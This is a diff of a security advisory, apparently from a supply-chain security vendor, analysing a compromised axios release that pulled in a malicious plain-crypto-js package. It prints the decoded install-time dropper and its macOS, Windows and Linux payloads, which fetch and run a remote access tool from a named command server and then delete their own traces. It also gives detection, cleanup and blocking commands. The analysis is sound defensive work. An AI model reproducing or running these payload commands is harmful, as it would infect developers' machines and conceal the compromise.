@@ -63,31 +63,31 @@ Event
 2026-03-30 05:57
 
 plain-crypto-js@4.2.0
- published by 
+ published by
 nrwise@proton.me
- — a clean decoy containing a full copy of the legitimate 
+ — a clean decoy containing a full copy of the legitimate
 crypto-js
- source, no 
+ source, no
 postinstall
  hook. Its sole purpose is to establish npm publishing history so the package does not appear as a zero-history account during later inspection.
 
 2026-03-30 23:59
 
 plain-crypto-js@4.2.1
- published by 
+ published by
 nrwise@proton.me
- — malicious payload added. The 
+ — malicious payload added. The
 postinstall: "node setup.js"
  hook and obfuscated dropper are introduced.
 
 2026-03-31 00:21
 
 axios@1.14.1
- published by compromised 
+ published by compromised
 jasonsaayman
- account (email: 
+ account (email:
 ifstap@proton.me
-) — injects 
+) — injects
 plain-crypto-js@4.2.1
  as a runtime dependency, targeting the modern 1.x user base.
 
@@ -98,37 +98,37 @@ axios@0.30.4
 
 2026-03-31 ~03:15
 
-npm unpublishes 
+npm unpublishes
 axios@1.14.1
- and 
+ and
 axios@0.30.4
-. Both versions are removed from the registry and the 
+. Both versions are removed from the registry and the
 latest
- dist-tag reverts to 
+ dist-tag reverts to
 1.14.0
-. 
+.
 axios@1.14.1
- had been live for approximately 2 hours 53 minutes; 
+ had been live for approximately 2 hours 53 minutes;
 axios@0.30.4
- for approximately 2 hours 15 minutes. Timestamp is inferred from the axios registry document's 
+ for approximately 2 hours 15 minutes. Timestamp is inferred from the axios registry document's
 modified
  field (03:15:30Z) — npm does not expose a dedicated per-version unpublish timestamp in its public API.
 
 2026-03-31 03:25
 
-npm initiates a security hold on 
+npm initiates a security hold on
 plain-crypto-js
 , beginning the process of replacing the malicious package with an npm security-holder stub.
 
 2026-03-31 04:26
 
-npm publishes the security-holder stub 
+npm publishes the security-holder stub
 plain-crypto-js@0.0.1-security.0
- under the 
+ under the
 npm@npmjs.com
- account, formally replacing the malicious package on the registry. 
+ account, formally replacing the malicious package on the registry.
 plain-crypto-js@4.2.1
- had been live for approximately 4 hours 27 minutes. Attempting to install any version of 
+ had been live for approximately 4 hours 27 minutes. Attempting to install any version of
 plain-crypto-js
  now returns the security notice.
 
@@ -147,31 +147,31 @@ A critical forensic signal is visible in the npm registry metadata. Every legiti
 "_npmUser"
 : {
 
- 
+
 "name"
-: 
+:
 "GitHub Actions"
 ,
 
- 
+
 "email"
-: 
+:
 "npm-oidc-no-reply@github.com"
 ,
 
- 
+
 "trustedPublisher"
 : {
 
- 
+
 "id"
-: 
+:
 "github"
 ,
 
- 
+
 "oidcConfigId"
-: 
+:
 "oidc:9061ef30-3132-49f4-b28c-9338d192a1a9"
 
  }
@@ -183,18 +183,18 @@ A critical forensic signal is visible in the npm registry metadata. Every legiti
 "_npmUser"
 : {
 
- 
+
 "name"
-: 
+:
 "jasonsaayman"
 ,
 
- 
+
 "email"
-: 
+:
 "ifstap@proton.me"
 
- 
+
 // no trustedPublisher, no gitHead, no corresponding GitHub commit or tag
 
 }
@@ -227,7 +227,7 @@ Change
 
 package.json
 
-no 
+no
 scripts
  section
 
@@ -248,7 +248,7 @@ package.md
 
 Not present
 
-Clean JSON stub reporting version 
+Clean JSON stub reporting version
 4.2.0
 
 Added: the anti-forensics cover
@@ -263,71 +263,71 @@ The anti-forensics stub (package.md) deserves particular attention. Aftersetup.j
 
 {
 
- 
+
 "name"
-: 
+:
 "plain-crypto-js"
 ,
 
- 
+
 "version"
-: 
+:
 "4.2.0"
-, 
+,
 // ← reports 4.2.0, not 4.2.1 — deliberate mismatch
 
- 
+
 "description"
-: 
+:
 "JavaScript library of crypto standards."
 ,
 
- 
+
 "license"
-: 
+:
 "MIT"
 ,
 
- 
+
 "author"
-: { 
+: {
 "name"
-: 
+:
 "Evan Vosberg"
-, 
+,
 "url"
-: 
+:
 "http://github.com/evanvosberg"
  },
 
- 
+
 "homepage"
-: 
+:
 "http://github.com/brix/crypto-js"
 ,
 
- 
+
 "repository"
-: { 
+: {
 "type"
-: 
+:
 "git"
-, 
+,
 "url"
-: 
+:
 "http://github.com/brix/crypto-js.git"
  },
 
- 
+
 "main"
-: 
+:
 "index.js"
 ,
 
- 
+
 // No "scripts" key — no postinstall, no test
 
- 
+
 "dependencies"
 : {}
 
@@ -341,10 +341,10 @@ $ npm list plain-crypto-js
 myproject@1.0.0
 └── plain-crypto-js@
 4.2.0
- 
+
 # ← reports 4.2.0, not 4.2.1
 
- 
+
 # but the dropper already ran as 4.2.1
 
 # The reliable check is the DIRECTORY PRESENCE, not the version number:
@@ -362,45 +362,45 @@ The difference between the realcrypto-js@4.2.0and the maliciousplain-crypto-js@4
 
 {
 
- 
+
 "name"
-: 
+:
 "crypto-js"
 ,
 
- 
+
 "version"
-: 
+:
 "4.2.0"
 ,
 
- 
+
 "description"
-: 
+:
 "JavaScript library of crypto standards."
 ,
 
- 
+
 "author"
-: 
+:
 "Evan Vosberg"
 ,
 
- 
+
 "homepage"
-: 
+:
 "http://github.com/brix/crypto-js"
 ,
 
- 
+
 "scripts"
 : {
 
- 
+
 "test"
-: 
+:
 "grunt"
- 
+
 // ← no postinstall
 
  }
@@ -411,57 +411,57 @@ The difference between the realcrypto-js@4.2.0and the maliciousplain-crypto-js@4
 
 {
 
- 
+
 "name"
-: 
+:
 "plain-crypto-js"
-, 
+,
 // ← different name, everything else cloned
 
- 
+
 "version"
-: 
+:
 "4.2.1"
-, 
+,
 // ← version one ahead of the real package
 
- 
+
 "description"
-: 
+:
 "JavaScript library of crypto standards."
 ,
 
- 
+
 "author"
-: { 
+: {
 "name"
-: 
+:
 "Evan Vosberg"
- }, 
+ },
 // ← fraudulent use of real author name
 
- 
+
 "homepage"
-: 
+:
 "http://github.com/brix/crypto-js"
-, 
+,
 // ← real repo, wrong package
 
- 
+
 "scripts"
 : {
 
- 
+
 "test"
-: 
+:
 "grunt"
 ,
 
- 
+
 "postinstall"
-: 
+:
 "node setup.js"
- 
+
 // ← THE ONLY DIFFERENCE. The entire weapon.
 
  }
@@ -502,19 +502,19 @@ A complete binary diff betweenaxios@1.14.0andaxios@1.14.1across all 86 files (ex
 DIFFERS
 : package.json
 
-Total differing files: 
+Total differing files:
 1
 
-Files only 
+Files only
 in
- 
+
 1.14
 .1
 : (none)
 
-Files only 
+Files only
 in
- 
+
 1.14
 .0
 : (none)
@@ -589,9 +589,9 @@ _trans_1(x, r)— XOR cipher. The key"OrDeR_7077"is parsed through JavaScript’
 
 charCode XOR key[(
 7
- × r × r) % 
+ × r × r) %
 10
-] XOR 
+] XOR
 333
 
 ‍
@@ -606,78 +606,78 @@ StepSecurity fully decoded every entry in thestq[]array. The recovered plaintext
 
 stq[
 0
-] → 
+] →
 "child_process"
- 
+
 // shell execution
 
 stq[
 1
-] → 
+] →
 "os"
- 
+
 // platform detection
 
 stq[
 2
-] → 
+] →
 "fs"
- 
+
 // filesystem operations
 
 stq[
 3
-] → 
+] →
 "http://sfrclak.com:8000/"
- 
+
 // C2 base URL
 
 stq[
 5
-] → 
+] →
 "win32"
- 
+
 // Windows platform identifier
 
 stq[
 6
-] → 
+] →
 "darwin"
- 
+
 // macOS platform identifier
 
 stq[
 12
-] → 
+] →
 "curl -o /tmp/ld.py -d packages.npm.org/product2 -s SCR_LINK && nohup python3 /tmp/ld.py SCR_LINK > /dev/null 2>&1 &"
 
 stq[
 13
-] → 
+] →
 "package.json"
- 
+
 // deleted after execution
 
 stq[
 14
-] → 
+] →
 "package.md"
- 
+
 // clean stub renamed to package.json
 
 stq[
 15
-] → 
+] →
 ".exe"
 
 stq[
 16
-] → 
+] →
 ".ps1"
 
 stq[
 17
-] → 
+] →
 ".vbs"
 
 The complete attack path fromnpm installto C2 contact and cleanup, across all three target platforms.
@@ -691,114 +691,114 @@ With all strings decoded, the dropper's full logic can be reconstructed and anno
 // SHA-256: e10b1fa84f1d6481625f741b69892780140d4e0e7769e7491e5f4d894c2e0e09
 
 const
- _entry = 
+ _entry =
 function
 (
 campaignId
-) 
+)
 {
 
- 
+
 try
  {
 
- 
+
 // Load Node.js built-in modules via decoded string table
 
- 
+
 const
- fs = 
+ fs =
 require
 (
 "fs"
-); 
+);
 // stq[2]
 
- 
+
 const
- os = 
+ os =
 require
 (
 "os"
-); 
+);
 // stq[1]
 
- 
+
 const
- { execSync } = 
+ { execSync } =
 require
 (
 "child_process"
-); 
+);
 // stq[0]
 
- 
+
 // Build the full C2 URL: base + campaign ID
 
- 
+
 // stq[3] = "http://sfrclak.com:8000/"
 
- 
+
 const
- c2Url = 
+ c2Url =
 "http://sfrclak.com:8000/"
  + campaignId;
 
- 
+
 // → "http://sfrclak.com:8000/6202033"
 
- 
+
 // Detect the operating system
 
- 
+
 const
- platform = os.platform(); 
+ platform = os.platform();
 // "darwin", "win32", or other
 
- 
+
 const
- tmpDir = os.tmpdir(); 
+ tmpDir = os.tmpdir();
 // "/tmp" on Linux/macOS, "%TEMP%" on Windows
 
- 
+
 // os.type(), os.release(), os.arch() are called but results discarded —
 
- 
+
 // likely sends them via the POST body or they are used in the stage-2
 
  os.type(); os.release(); os.arch();
 
- 
+
 let
- execCommand = 
+ execCommand =
 ""
 ;
 
- 
+
 // ─────────────────────────────────────────────────
 
- 
+
 // BRANCH 1: macOS (darwin)
 
- 
+
 // ─────────────────────────────────────────────────
 
- 
+
 if
- (platform === 
+ (platform ===
 "darwin"
 ) {
 
- 
+
 const
- scriptPath = tmpDir + 
+ scriptPath = tmpDir +
 "/"
- + campaignId; 
+ + campaignId;
 // /tmp/6202033
 
- 
+
 const
- appleScript = 
+ appleScript =
 `
 
  set {a, s, d} to {"", "
@@ -811,83 +811,83 @@ ${c2Url}
 
  end try
 
- do shell script "rm -rf 
+ do shell script "rm -rf
 ${scriptPath}
 "`
 ;
 
  fs.writeFileSync(scriptPath, appleScript);
 
- execCommand = 
+ execCommand =
 `nohup osascript "
 ${scriptPath}
 " > /dev/null 2>&1 &`
 ;
 
- 
+
 // ─────────────────────────────────────────────────
 
- 
+
 // BRANCH 2: Windows (win32)
 
- 
+
 // ─────────────────────────────────────────────────
 
- } 
+ }
 else
- 
+
 if
- (platform === 
+ (platform ===
 "win32"
 ) {
 
- 
+
 const
  psPath = execSync(
 "where powershell"
 ).toString().trim();
 
- 
+
 const
- wtPath = process.env.PROGRAMDATA + 
+ wtPath = process.env.PROGRAMDATA +
 "\\wt.exe"
 ;
 
- 
+
 if
  (!fs.existsSync(wtPath)) {
 
  fs.copyFileSync(psPath, wtPath);
 
- 
+
 // Creates a persistent copy of PowerShell. wt.exe is Windows Terminal's
 
- 
+
 // binary name — a legitimate-looking process in %PROGRAMDATA%.
 
  }
 
- 
+
 const
- ps1Path = tmpDir + 
+ ps1Path = tmpDir +
 "\\"
- + campaignId + 
+ + campaignId +
 ".ps1"
-; 
+;
 // %TEMP%\6202033.ps1
 
- 
+
 const
- vbsPath = tmpDir + 
+ vbsPath = tmpDir +
 "\\"
- + campaignId + 
+ + campaignId +
 ".vbs"
-; 
+;
 // %TEMP%\6202033.vbs
 
- 
+
 const
- vbScript = 
+ vbScript =
 `
 
  Set objShell = CreateObject("WScript.Shell")
@@ -909,7 +909,7 @@ ${ps1Path}
 
  fs.writeFileSync(vbsPath, vbScript);
 
- execCommand = 
+ execCommand =
 `cscript "
 ${vbsPath}
 " //nologo && del "
@@ -917,88 +917,88 @@ ${vbsPath}
 " /f`
 ;
 
- 
+
 // ─────────────────────────────────────────────────
 
- 
+
 // BRANCH 3: Linux / other
 
- 
+
 // ─────────────────────────────────────────────────
 
- } 
+ }
 else
  {
 
- execCommand = 
-`curl -o /tmp/ld.py -d packages.npm.org/product2 -s 
+ execCommand =
+`curl -o /tmp/ld.py -d packages.npm.org/product2 -s
 ${c2Url}
- && nohup python3 /tmp/ld.py 
+ && nohup python3 /tmp/ld.py
 ${c2Url}
  > /dev/null 2>&1 &`
 ;
 
- 
+
 // curl and nohup chained with &&: nohup only runs if curl succeeded.
 
- 
+
 // If the C2 is unreachable, chain silently fails — npm install still exits 0.
 
  }
 
- 
+
 // execSync is blocking, but all three commands return immediately because
 
- 
+
 // the real work is detached to background processes (nohup / cscript 0,False)
 
  execSync(execCommand);
 
- 
+
 // ─────────────────────────────────────────────────
 
- 
+
 // ANTI-FORENSICS: cover tracks
 
- 
+
 // ─────────────────────────────────────────────────
 
- 
+
 const
  selfPath = __filename;
 
- fs.unlink(selfPath, 
+ fs.unlink(selfPath,
 () =>
- {}); 
+ {});
 // 1. Delete setup.js itself
 
  fs.unlink(
 "package.json"
-, 
+,
 () =>
- {}); 
+ {});
 // 2. Delete malicious package.json
 
  fs.rename(
 "package.md"
-, 
+,
 "package.json"
-, 
+,
 () =>
- {}); 
+ {});
 // 3. Install clean v4.2.0 stub
 
- } 
+ }
 catch
 (e) {
 
- 
+
 // Silent catch — any error (C2 unreachable, permission denied, etc.)
 
- 
+
 // is swallowed completely. npm install always exits with code 0.
 
- 
+
 // The developer never sees any indication that anything went wrong.
 
  }
@@ -1059,60 +1059,60 @@ The following are the complete, fully resolved payloads as they execute on victi
 
 #### macOS — Full AppleScript written to/tmp/6202033
 
--- Written to: 
+-- Written to:
 /tmp/
 6202033
 
--- Executed via: nohup osascript 
+-- Executed via: nohup osascript
 "/tmp/6202033"
- > 
+ >
 /dev/
 null
- 
+
 2
 >&
 1
  &
 
--- This file is deleted by the script itself 
+-- This file is deleted by the script itself
 in
- the final 
+ the final
 do
  shell script line
 
 set {a, s, d} to {
 ""
-, 
+,
 "http://sfrclak.com:8000/6202033"
-, 
+,
 "/Library/Caches/com.apple.act.mond"
 }
 
- 
+
 try
 
- 
+
 do
- shell script 
+ shell script
 "curl -o "
- & d & a & 
+ & d & a &
 " -d packages.npm.org/product0"
- & 
+ &
 " -s "
- & s & 
+ & s &
 " && chmod 770 "
- & d & 
+ & d &
 " && /bin/zsh -c \""
- & d & 
+ & d &
 " "
- & s & 
+ & s &
 " &\" &> /dev/null"
 
- end 
+ end
 try
 
 do
- shell script 
+ shell script
 "rm -rf /tmp/6202033"
 
 When executed, this AppleScript expands to the following shell command:
@@ -1124,17 +1124,17 @@ curl -o /Library/Caches/com.apple.act.mond \
  -s http:
 //sfrclak.com:8000/6202033 \
 
- && chmod 
+ && chmod
 770
  /Library/Caches/com.apple.act.mond \
 
- && 
+ &&
 /bin/
-zsh -c 
+zsh -c
 "/Library/Caches/com.apple.act.mond http://sfrclak.com:8000/6202033 &"
  \
 
- >& 
+ >&
 /dev/
 null
 
@@ -1143,13 +1143,13 @@ null
 ' Written to: %TEMP%\6202033.vbs
 
 '
- Executed via: cscript 
+ Executed via: cscript
 "%TEMP%\6202033.vbs"
- 
+
 //nologo && del "%TEMP%\6202033.vbs" /f
 
 ' objShell.Run arg 2=0 (hidden window), arg 3=False (don'
-t wait 
+t wait
 for
  completion)
 
@@ -1158,7 +1158,7 @@ Set
 "WScript.Shell"
 )
 
-objShell.Run 
+objShell.Run
 "cmd.exe /c curl -s -X POST -d "
 "packages.npm.org/product1"
 " "
@@ -1174,13 +1174,13 @@ objShell.Run
 " & del "
 "%TEMP%\6202033.ps1"
 " /f"
-, 
+,
 0
 , False
 
 #### Linux — DirectexecSyncshell command
 
-# Executed directly via execSync() 
+# Executed directly via execSync()
 in
  Node.js — no intermediate file
 
@@ -1244,7 +1244,7 @@ Why both connections showcalledBy: "infra":When Harden-Runner can trace a networ
 
 Harden-Runner captures everyexecvesyscall. The raw process events reconstruct the exact execution chain fromnpm installto C2 contact:
 
-PID 
+PID
 2366
  bash /home/runner/work/_temp
 /***.sh [01:30:48.186Z]
@@ -1289,7 +1289,7 @@ The file event log captures every file write by PID. Theplain-crypto-js/package.
 
 File: node_modules/plain-crypto-js/package.json
 
- Write 
+ Write
 1
  — pid=
 2380
@@ -1303,15 +1303,15 @@ File: node_modules/plain-crypto-js/package.json
 
  Malicious package.json written to disk during install.
 
- 
+
 Contains
-: { 
+: {
 "postinstall"
-: 
+:
 "node setup.js"
  }
 
- Write 
+ Write
 2
  — pid=
 2392
@@ -1323,15 +1323,15 @@ Contains
 27.
 736Z [+36s]
 
- Dropper overwrites package.json 
+ Dropper overwrites package.json
 with
- clean stub 
+ clean stub
 from
  package.md.
 
- 
+
 Contains
-: version 
+: version
 4.2
 .0
  manifest, no scripts, no postinstall.
@@ -1378,27 +1378,27 @@ Safe Version Reference
 
 Step 1 – Check for the malicious axios versions in your project:
 
-npm list axios 
+npm list axios
 2
 >
 /dev/
 null
- | grep -E 
+ | grep -E
 "1\.14\.1|0\.30\.4"
 
-grep -A1 
+grep -A1
 '"axios"'
- package-lock.json | grep -E 
+ package-lock.json | grep -E
 "1\.14\.1|0\.30\.4"
 
 Step 2 – Check forplain-crypto-jsinnode_modules:
 
-ls node_modules/plain-crypto-js 
+ls node_modules/plain-crypto-js
 2
 >
 /dev/
 null
- && echo 
+ && echo
 "POTENTIALLY AFFECTED"
 
 Ifsetup.jsalready ran,package.jsoninside this directory will have been replaced with a clean stub. The presence of the directory alone is sufficient evidence the dropper executed.
@@ -1407,32 +1407,32 @@ Step 3 – Check for RAT artifacts on affected systems:
 
 # macOS
 
-ls -la /Library/Caches/com.apple.act.mond 
+ls -la /Library/Caches/com.apple.act.mond
 2
 >
 /dev/
 null
- && echo 
+ && echo
 "COMPROMISED"
 
 # Linux
 
-ls -la /tmp/ld.py 
+ls -la /tmp/ld.py
 2
 >
 /dev/
 null
- && echo 
+ && echo
 "COMPROMISED"
 
- 
+
 "COMPROMISED"
 
 # Windows (cmd.exe)
 
-dir 
+dir
 "%PROGRAMDATA%\wt.exe"
- 
+
 2
 >nul && echo COMPROMISED
 
@@ -1447,56 +1447,56 @@ Review pipeline logs for anynpm installexecutions that may have pulledaxios@1.14
 npm install axios@
 1.14
 .0
- # 
+ #
 for
- 
+
 1.
 x users
 
 npm install axios@
 0.30
 .3
- # 
+ #
 for
- 
+
 0.
-x users 
+x users
 
 2. Add anoverridesblock to prevent transitive resolution back to the malicious versions
 
 {
 
- 
+
 "dependencies"
-: { 
+: {
 "axios"
-: 
+:
 "1.14.0"
  },
 
- 
+
 "overrides"
-: { 
+: {
 "axios"
-: 
+:
 "1.14.0"
  },
 
- 
+
 "resolutions"
-: { 
+: {
 "axios"
-: 
+:
 "1.14.0"
  }
 
-} 
+}
 
 3. Removeplain-crypto-jsfromnode_modules.
 
 rm -rf node_modules/plain-crypto-js
 
-npm install --ignore-scripts 
+npm install --ignore-scripts
 
 4. If a RAT artifact is found: treat the system as fully compromised. Do not attempt to clean in place - rebuild from a known-good state. Rotate all credentials on any system where the malicious package ran: npm tokens, AWS access keys, SSH private keys, cloud credentials (GCP, Azure), CI/CD secrets, and any values present in.envfiles accessible at install time.
 
@@ -1504,13 +1504,13 @@ npm install --ignore-scripts
 
 6. Use--ignore-scriptsin CI/CD as a standing policy to preventpostinstallhooks from running during automated builds:
 
-npm ci --ignore-scripts 
+npm ci --ignore-scripts
 
 7. Block C2 traffic at the network/DNS layer as a precaution on any potentially exposed system
 
  # Block via firewall (Linux)
 
-iptables -A OUTPUT -d 
+iptables -A OUTPUT -d
 142.11
 .206
 .73
@@ -1518,11 +1518,11 @@ iptables -A OUTPUT -d
 
 # Block via /etc/hosts (macOS/Linux)
 
-echo 
+echo
 "0.0.0.0 sfrclak.com"
- >> 
+ >>
 /etc/
-hosts 
+hosts
 
 ## For StepSecurity Enterprise Customers
 
